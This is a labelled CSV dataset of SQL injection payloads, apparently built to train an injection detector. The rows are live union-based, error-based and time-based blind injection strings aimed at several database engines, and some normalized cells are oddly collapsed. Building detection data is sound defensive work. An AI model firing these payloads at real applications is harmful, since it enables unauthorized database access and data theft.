payload_raw,label,source,sqli_type_hint,is_obfuscated,payload_norm,payload_delex
"1%'   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,sqli_dataset.csv,,False,"1%' ) ) ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --","<NUM>%' ) ) ) or <NUM> = ( select count ( * ) from generate_series ( <NUM>,<NUM> ) ) --"
select 'qqpjq'||  (  case 5118 when 5118 then 1 else 0 end  )  ||'qzvzq' from rdb$database,1,sqli_dataset.csv,,False,select 'qqpjq'|| ( case 5118 when 5118 then 1 else 0 end ) ||'qzvzq' from rdb$database,select <STR>|| ( case <NUM> when <NUM> then <NUM> else <NUM> end ) ||<STR> from rdb$database
"1'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   'holo'  =  'holo",1,sqli_dataset.csv,,False,"1' ) ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( 'holo' = 'holo",<NUM><STR>holo<STR>holo
"1'   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'mexd' like 'mexd",1,sqli_dataset.csv,,True,"1' ) ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ( 'mexd' like 'mexd",<NUM><STR>mexd<STR>mexd
select   (  case when   (  4780  =  4432  )   then 4780 else 4780*  (  select 4780 from mysql.db  )   end  )  #,1,sqli_dataset.csv,,False,select ( case when ( 4780 = 4432 ) then 4780 else 4780* ( select 4780 from mysql.db ) end ) #,select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM>* ( select <NUM> from mysql.db ) end ) #
"1"" where 7599  =  7599",1,sqli_dataset.csv,,False,"1"" where 7599 = 7599","<NUM>"" where <NUM> = <NUM>"
"1 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  # bzoq",1,sqli_dataset.csv,,False,"1 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) # bzoq","<NUM> or <NUM> = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) # bzoq"
1%'   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  '%'  =  ',1,sqli_dataset.csv,,False,1%' ) ) ) and ( 3020 = 3020 ) *6703 and ( ( ( '%' = ',<NUM>%<STR>%<STR>
1'||  (  select 'yzdz' where 5021  =  5021,1,sqli_dataset.csv,,False,1'|| ( select 'yzdz' where 5021 = 5021,<NUM><STR>yzdz' where <NUM> = <NUM>
-4617'   )    )     )   or 9323  =  9323#,1,sqli_dataset.csv,,False,-4617' ) ) ) or 9323 = 9323#,-<NUM>' ) ) ) or <NUM> = <NUM>#
"1'  )   as khaa where 8157  =  8157 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,sqli_dataset.csv,,True,"1' ) as khaa where 8157 = 8157 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #","<NUM>' ) as khaa where <NUM> = <NUM> and <NUM> = benchmark ( <NUM>,md5 ( 0x6d457153 ) ) #"
"1   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  6556  =  6556",1,sqli_dataset.csv,,True,"1 ) ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( ( 6556 = 6556","<NUM> ) ) ) and <NUM> = benchmark ( <NUM>,md5 ( 0x76555642 ) ) and ( ( ( <NUM> = <NUM>"
"1"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and ""uvoq"" like ""uvoq",1,sqli_dataset.csv,,False,"1"" or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ""uvoq"" like ""uvoq",<NUM><STR>uvoq<STR>uvoq
"1,iif  (  7475  =  7475,1,1/0  )  ",1,sqli_dataset.csv,,False,"1,iif ( 7475 = 7475,1,1/0 )","<NUM>,iif ( <NUM> = <NUM>,<NUM>,<NUM>/<NUM> )"
"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",1,sqli_dataset.csv,,False,"-7564' ) as nank where 8095 = 8095 union all select 8095,8095,8095--","-<NUM>' ) as nank where <NUM> = <NUM> union all select <NUM>,<NUM>,<NUM>--"
1  )   as pyjx where 9005  =  9005,1,sqli_dataset.csv,,False,1 ) as pyjx where 9005 = 9005,<NUM> ) as pyjx where <NUM> = <NUM>
"1""  )   as doai where 7024  =  7024 union all select null,null,null,null,null,null,null,null--",1,sqli_dataset.csv,,False,"1"" ) as doai where 7024 = 7024 union all select null,null,null,null,null,null,null,null--","<NUM>"" ) as doai where <NUM> = <NUM> union all select null,null,null,null,null,null,null,null--"
"1"" and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and ""uvvy"" like ""uvvy",1,sqli_dataset.csv,,False,"1"" and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ""uvvy"" like ""uvvy",<NUM><STR>uvvy<STR>uvvy
"1""   )    )     )   union all select null,null,null,null,null,null,null,null,null#",1,sqli_dataset.csv,,False,"1"" ) ) ) union all select null,null,null,null,null,null,null,null,null#","<NUM>"" ) ) ) union all select null,null,null,null,null,null,null,null,null#"
"-2254'  )   as dyrv where 9079  =  9079 union all select 9079,9079,9079,9079,9079,9079,9079,9079#",1,sqli_dataset.csv,,False,"-2254' ) as dyrv where 9079 = 9079 union all select 9079,9079,9079,9079,9079,9079,9079,9079#","-<NUM>' ) as dyrv where <NUM> = <NUM> union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>#"
"1%'  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  '%'  =  '",1,sqli_dataset.csv,,True,"1%' ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( '%' = '",<NUM>%<STR>%<STR>
"1%""  )   union all select null,null,null,null,null,null,null,null,null--",1,sqli_dataset.csv,,False,"1%"" ) union all select null,null,null,null,null,null,null,null,null--","<NUM>%"" ) union all select null,null,null,null,null,null,null,null,null--"
"1"" and 9468  =  7105--",1,sqli_dataset.csv,,False,"1"" and 9468 = 7105--","<NUM>"" and <NUM> = <NUM>--"
"1'  )   where 1225  =  1225 and elt  (  8831  =  7779,7779  )  --",1,sqli_dataset.csv,,False,"1' ) where 1225 = 1225 and elt ( 8831 = 7779,7779 ) --","<NUM>' ) where <NUM> = <NUM> and elt ( <NUM> = <NUM>,<NUM> ) --"
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  'jutx'  =  'jutx",1,sqli_dataset.csv,,False,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ( ( 'jutx' = 'jutx","select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ( ( <STR> = 'jutx"
"1' in boolean mode  )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,sqli_dataset.csv,,False,"1' in boolean mode ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --","<NUM>' in boolean mode ) or char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) = regexp_substring ( repeat ( right ( char ( <NUM> ) ,<NUM> ) ,<NUM> ) ,null ) --"
"1"" or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,sqli_dataset.csv,,False,"1"" or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --","<NUM>"" or char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) = regexp_substring ( repeat ( left ( crypt_key ( char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ,null ) ,<NUM> ) ,<NUM> ) ,null ) --"
"1%""  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  ""%""  =  """,1,sqli_dataset.csv,,False,"1%"" ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ""%"" = """,<NUM>%<STR>%<STR>
"1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#",1,sqli_dataset.csv,,False,"1'|| ( select 'pygt' from dual where 5543 = 5543 union all select null,null,null,null,null,null#","<NUM><STR>pygt' from dual where <NUM> = <NUM> union all select null,null,null,null,null,null#"
"1  )   union all select null,null,null--",1,sqli_dataset.csv,,False,"1 ) union all select null,null,null--","<NUM> ) union all select null,null,null--"
"1'+  (  select 'pgje' where 4658  =  4658 union all select null,null,null,null,null,null,null,null,null,null#",1,sqli_dataset.csv,,True,"1'+ ( select 'pgje' where 4658 = 4658 union all select null,null,null,null,null,null,null,null,null,null#","<NUM><STR>pgje' where <NUM> = <NUM> union all select null,null,null,null,null,null,null,null,null,null#"
select   (  case when   (  1812  =  2446  )   then 1812 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,sqli_dataset.csv,,False,select ( case when ( 1812 = 2446 ) then 1812 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,select ( case when ( <NUM> = <NUM> ) then <NUM> else cast ( <NUM> as int ) / ( select <NUM> from dual ) end ) from dual--
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""%""  =  """,1,sqli_dataset.csv,,False,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( ( ""%"" = ""","call regexp_substring ( repeat ( right ( char ( <NUM> ) ,<NUM> ) ,<NUM> ) ,null ) and ( ( ( <STR> = """
select   (  case when   (  8375  =  8318  )   then 8375 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,sqli_dataset.csv,,False,select ( case when ( 8375 = 8318 ) then 8375 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,select ( case when ( <NUM> = <NUM> ) then <NUM> else cast ( <NUM> as int ) / ( select <NUM> from dual ) end ) from dual--
"1' in boolean mode  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   #",1,sqli_dataset.csv,,True,"1' in boolean mode ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) #","<NUM>' in boolean mode ) and extractvalue ( <NUM>,concat ( 0x5c,0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71 ) ) #"
"1 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,sqli_dataset.csv,,False,"1 and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --","<NUM> and <NUM> = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --"
select   (  case when   (  6166  =  3364  )   then 6166 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,sqli_dataset.csv,,False,select ( case when ( 6166 = 3364 ) then 6166 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,select ( case when ( <NUM> = <NUM> ) then <NUM> else cast ( <NUM> as int ) / ( select <NUM> from dual ) end ) from dual--
"1 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   ",1,sqli_dataset.csv,,True,"1 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) )","<NUM> or extractvalue ( <NUM>,concat ( 0x5c,0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71 ) )"
1 where 1576  =  1576,1,sqli_dataset.csv,,False,1 where 1576 = 1576,<NUM> where <NUM> = <NUM>
"1""   )    )     )   and 9198  =  9198--",1,sqli_dataset.csv,,False,"1"" ) ) ) and 9198 = 9198--","<NUM>"" ) ) ) and <NUM> = <NUM>--"
"1""   )    )    as tngu where 3644  =  3644 union all select null--",1,sqli_dataset.csv,,False,"1"" ) ) as tngu where 3644 = 3644 union all select null--","<NUM>"" ) ) as tngu where <NUM> = <NUM> union all select null--"
1'+  (  select 'iyyv' where 9500  =  9500 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu   )    )   +',1,sqli_dataset.csv,,True,1'+ ( select 'iyyv' where 9500 = 9500 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) ) +',<NUM><STR>iyyv<STR>
"-6130 union all select 3211,3211,3211,3211,3211,3211,3211,3211,3211#",1,sqli_dataset.csv,,False,"-6130 union all select 3211,3211,3211,3211,3211,3211,3211,3211,3211#","-<NUM> union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>#"
"1""  )   where 6367  =  6367 union all select null,null,null,null,null,null,null#",1,sqli_dataset.csv,,False,"1"" ) where 6367 = 6367 union all select null,null,null,null,null,null,null#","<NUM>"" ) where <NUM> = <NUM> union all select null,null,null,null,null,null,null#"
-1641'   )    )    or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   'vgcb' like 'vgcb,1,sqli_dataset.csv,,False,-1641' ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( 'vgcb' like 'vgcb,-<NUM><STR>vgcb<STR>vgcb
